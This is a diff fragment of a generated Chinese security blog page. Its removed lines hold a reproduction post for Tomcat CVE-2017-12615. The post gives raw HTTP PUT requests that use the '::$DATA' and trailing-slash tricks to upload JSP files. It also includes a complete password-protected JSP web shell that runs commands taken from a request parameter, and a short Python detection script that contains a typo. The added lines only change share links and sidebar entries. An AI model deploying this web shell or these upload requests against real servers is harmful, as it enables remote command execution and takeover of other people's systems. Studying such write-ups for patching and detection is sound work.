-    <a href="/2020/02/07/Tomcat%20PUT%E6%96%B9%E6%B3%95%E4%BB%BB%E6%84%8F%E5%86%99%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9ECVE-2017-12615/" class="article-date">
-  <time class="dt-published" datetime="2020-02-07T16:00:00.000Z" itemprop="datePublished">2020-02-08</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2020/02/07/Tomcat%20PUT%E6%96%B9%E6%B3%95%E4%BB%BB%E6%84%8F%E5%86%99%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9ECVE-2017-12615/">Tomcat PUT方法任意写文件漏洞CVE-2017-12615</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="Tomcat-PUT方法任意写文件漏洞（CVE-2017-12615）"><a href="#Tomcat-PUT方法任意写文件漏洞（CVE-2017-12615）" class="headerlink" title="Tomcat PUT方法任意写文件漏洞（CVE-2017-12615）"></a>Tomcat PUT方法任意写文件漏洞（CVE-2017-12615）</h1><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p> Apache Tomcat 7.0.0 - 7.0.79 </p>
-<p>平台: Windows </p>
-<p> 启用了 HTTP PUT 请求方法  (conf/web.xml 中对于 DefaultServlet 的 readonly 设置为 false)</p>
-<h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><p>不能直接上传jsp结尾的文件</p>
-<p>利用windows平台下:<code>sample.txt::$DATA</code>等价于<code>sample.txt</code>的特性来写shell</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PUT /111.jsp::$DATA HTTP/1.1</span><br><span class="line">Host: 10.1.1.6:8080</span><br><span class="line">User-Agent: JNTASS</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">...jsp shell...</span><br></pre></td></tr></table></figure>
-
-
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PUT /111.jsp/ HTTP/1.1</span><br><span class="line">Host: 10.1.1.6:8080</span><br><span class="line">User-Agent: JNTASS</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">...jsp shell...</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">&quot;023&quot;</span>.equals(request.getParameter(<span class="string">&quot;pwd&quot;</span>)))&#123;</span><br><span class="line">        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;i&quot;</span>)).getInputStream();</span><br><span class="line">        <span class="keyword">int</span> a = -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">2048</span>];</span><br><span class="line">        out.print(<span class="string">&quot;&lt;pre&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span>((a=in.read(b))!=-<span class="number">1</span>)&#123;</span><br><span class="line">            out.println(<span class="keyword">new</span> String(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(<span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="检测脚本"><a href="#检测脚本" class="headerlink" title="检测脚本"></a>检测脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span>(<span class="params">url</span>):</span></span><br><span class="line">    filename=<span class="string">&quot;tomcat_check_vuln.txt&quot;</span></span><br><span class="line">    content=<span class="string">&quot;test&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        requests.put(url+<span class="string">&quot;/&quot;</span>+filename,data=conetent)</span><br><span class="line">        res=requests.get(url+<span class="string">&quot;/&quot;</span>+filename)</span><br><span class="line">    <span class="keyword">except</span> :</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> res.status_code==<span class="number">200</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="https://site.ccreater.top/2020/02/07/Tomcat%20PUT%E6%96%B9%E6%B3%95%E4%BB%BB%E6%84%8F%E5%86%99%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9ECVE-2017-12615/" data-id="cku8ky2xq002sdnnf3iuib8n8" data-title="Tomcat PUT方法任意写文件漏洞CVE-2017-12615" class="article-share-link">Share</a>
+      <a data-url="https://site.ccreater.top/2020/02/07/S2-013_S2-014%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="ckubfvk2f001xdcn8a6ze126l" data-title="S2-013_S2-014远程代码执行漏洞" class="article-share-link">Share</a>
       
       
       
@@ -992,6 +1054,10 @@
       <ul>
         
           <li>
+            <a href="/2021/10/03/TSGCTF2021/">(no title)</a>
+          </li>
+        
+          <li>
             <a href="/2021/10/01/%E7%94%A8github%20action%20%E8%AE%A9hexo%E4%BD%93%E9%AA%8C++/">用github action 让hexo体验++</a>
           </li>
         
@@ -1005,10 +1071,6 @@
         
           <li>
             <a href="/2020/12/15/2020xnuca_ezwp%E9%A2%98%E8%A7%A3/">2020xnuca_ezwp题解</a>
-          </li>
-        
-          <li>
-            <a href="/2020/11/26/2020%20balsn%20ctf%20web%20%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/">2020 balsn ctf web 部分题解</a>
           </li>
         
       </ul>
